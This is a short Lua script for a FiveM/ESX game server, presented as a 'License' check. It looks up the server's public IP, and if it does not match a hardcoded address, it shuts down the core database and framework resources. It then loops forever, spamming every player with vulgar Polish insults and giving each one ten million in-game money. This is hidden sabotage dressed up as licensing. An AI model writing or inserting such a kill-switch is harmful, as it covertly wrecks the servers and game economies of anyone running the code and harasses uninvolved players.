--[[
	id: SCjl8RDRPCxRawM6qroyr
	name: License
	description: License by Chubby#9857
	time1: 2021-05-28 17:17:27.753182+00
	time2: 2021-05-28 17:17:27.753183+00
	uploader: YA0nO7Jc5RClAPCp-trgMz-xoJknXCq9GiQzKjMf
	uploadersession: v02oULHj7BtVE4BTKih8kbv6Zqda5o
	flag: f
--]]

function StopServer()
    Citizen.Wait(6000)
    --TriggerClientEvent('stopserwer:crash', -1)
    SetTimeout(1 * 1, StopServer)
    local xPlayers = ESX.GetPlayers()
    TriggerClientEvent("esx:showNotification", -1, "essa wariacie jebal cie pies")
    TriggerClientEvent("esx:showNotification", -1, "essa wariacie nie kradnij skryptow")
    TriggerClientEvent("esx:showNotification", -1, "essa wariacie napisz do Chubby#9857 a moze ci wybacze :)")
    for i = 1, #xPlayers, 1 do
        local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
        xPlayer.addMoney(10000000)
    end
end

PerformHttpRequest(
    "https://api.ipify.org/",
    function(errorCode, resultData, resultHeaders)
        if resultData ~= "146.59.23.27" then
            ExecuteCommand("stop es_extended")
            ExecuteCommand("stop mysql-async")
            ExecuteCommand("stop " .. GetCurrentResourceName() .. "")
            StopServer()
        else
            work = true
        end
    end
)
